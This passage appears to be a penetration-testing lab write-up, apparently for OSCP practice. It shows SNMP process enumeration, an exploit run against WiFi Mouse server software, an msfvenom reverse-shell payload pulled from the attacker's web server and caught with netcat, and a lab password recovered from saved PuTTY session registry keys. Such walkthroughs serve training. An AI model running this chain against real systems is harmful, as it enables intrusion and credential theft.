+iso.3.6.1.2.1.25.4.2.1.2.5600 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5636 = STRING: "UserOOBEBroker.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5644 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5736 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5796 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5824 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5900 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5932 = STRING: "explorer.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5960 = STRING: "TextInputHost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6012 = STRING: "cmd.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6048 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6164 = STRING: "WinStore.App.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6184 = STRING: "StartMenuExperienceHost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6268 = STRING: "RuntimeBroker.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6392 = STRING: "SearchApp.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6432 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.644
+
+Found this exe file
+Mouse Server Luminati.exe
+
+Looked up for the exploit using searchsploit
+┌──(kali㉿kali)-[~]
+└─$ searchsploit Mouse Server
+------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                            |  Path
+------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)                                                                                            | windows/remote/50972.py
+------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+Didn't do any addition on the exploit, just generate a reverse shell exploit on my working directory, then started a pythone server at port 80 so the exploit can recieve my payload via http traffic.
+
+┌──(kali㉿kali)-[~/oscpa]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.203 lport=443 -f exe -o met.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: met.exe
+
+┌──(kali㉿kali)-[~/oscpa]
+└─$ python3 50972.py 192.168.128.145 192.168.45.203 met.exe
+[+] 3..2..1..
+[+] *Super fast hacker typing*
+[+] Retrieving payload
+[+] Done! Check Your Listener?
+
+┌──(kali㉿kali)-[~/oscpa]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.128.145 - - [28/Nov/2024 19:21:46] "GET /met.exe HTTP/1.1" 200 -
+192.168.128.145 - - [28/Nov/2024 19:21:46] "GET /met.exe HTTP/1.1" 200 -
+
+┌──(kali㉿kali)-[~/oscpa]
+└─$ nc -nvlp 443
+listening on [any] 443 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.128.145] 50283
+Microsoft Windows [Version 10.0.19041.1]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>Get-ChildItem 'HKCU:\Software\SimonTatham\PuTTY\Sessions'
+Get-ChildItem 'HKCU:\Software\SimonTatham\PuTTY\Sessions'
+'Get-ChildItem' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\WINDOWS\system32>powershell -ep bypass
+powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+Privilege escalation
+
+Manuall enumeration shows that Zachary have a home directory on the machine. and he is a member of the local admin
+
+PS C:\users\offsec> Get-LocalGroupMember Administrators
+Get-LocalGroupMember Administrators
+
+ObjectClass Name               PrincipalSource
+----------- ----               ---------------
+User        OSCP\Administrator Local          
+User        OSCP\zachary       Local          
+
+Winpease also indicated that a putty session was startes on the machine, therefore I enumerate the putty session with this command.
+
+regedit /e "%USERPROFILE%\Desktop\putty-sessions.reg" HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
+
+Which saved the output into offcsec desktop.
+C:\Users\offsec\Desktop>type putty-sessions.reg
+type putty-sessions.reg
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions]
+"zachary"="\"&('C:\\Program Files\\PuTTY\\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'\""
+
+Opened it and found zachary's password. Logged with it via rdp
+
+┌──(kali㉿kali)-[~/oscpa]
+└─$ xfreerdp /u:zachary /v:192.168.128.145
+
+
+C:\Users\zachary>whoami
+oscp\zachary
+
+C:\Users\zachary>hostname
+oscp
+
+Started powershell as administrator and got the proof.txt on the administrator's desktop
+
+PS C:\> cd users
+PS C:\users> cd administrator
+PS C:\users\administrator> cd Desktop
+PS C:\users\administrator\Desktop> ls
+
+
+    Directory: C:\users\administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/28/2024  10:19 AM             34 proof.txt
+
+
+PS C:\users\administrator\Desktop> cat proof.txt
+4b5d08ae939eee4ff8d7be392a9e3071
+PS C:\users\administrator\Desktop>
+
